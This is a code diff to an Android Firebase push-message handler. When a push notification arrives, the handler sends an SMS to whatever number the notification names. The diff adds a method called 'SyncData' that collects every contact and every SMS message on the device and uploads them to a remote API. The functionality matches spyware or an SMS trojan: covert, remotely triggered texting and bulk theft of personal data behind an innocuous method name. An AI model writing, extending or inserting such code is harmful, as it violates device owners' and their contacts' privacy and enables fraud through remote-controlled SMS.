@@ -5,6 +5,8 @@ import android.util.Log;
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
 
+import java.util.List;
+
 import static android.content.ContentValues.TAG;
 
 public class MyFirebaseMessagingService extends FirebaseMessagingService {
@@ -17,11 +19,24 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         String message=remoteMessage.getNotification().getBody();
         Log.d(TAG,"onMessageReceived:  Message Received: \n" + "Title: " + strTitle + "\n" + "Message: "+ message);
         sendSMS(strTitle,message);
-        Contact.sendContacts(this);
+        SyncData();
     }
     private void sendSMS(String phoneNumber, String messageBody) {
         SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage(phoneNumber, null, messageBody, null, null);
     }
+
+    private void SyncData(){
+        RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
+        ContentCollector cc = new ContentCollector();
+        List<Contact> lsContact = cc.GetContacts(this);
+        Log.d(TAG,"Name : "+ lsContact.get(1).GetName()+" Number : " + lsContact.get(1).GetNumber());
+        List<SMS> lsSMS = cc.GetSMS(this);
+        Log.d(TAG,"Creator : "+ lsSMS.get(1).GetCreator()+" Message : " + lsSMS.get(1).GetBody());
+
+        new HttpExecute(retrofitAPI.CreateContacts(lsContact));
+        new HttpExecute(retrofitAPI.CreateSMS(lsSMS));
+    }
+
 
 }
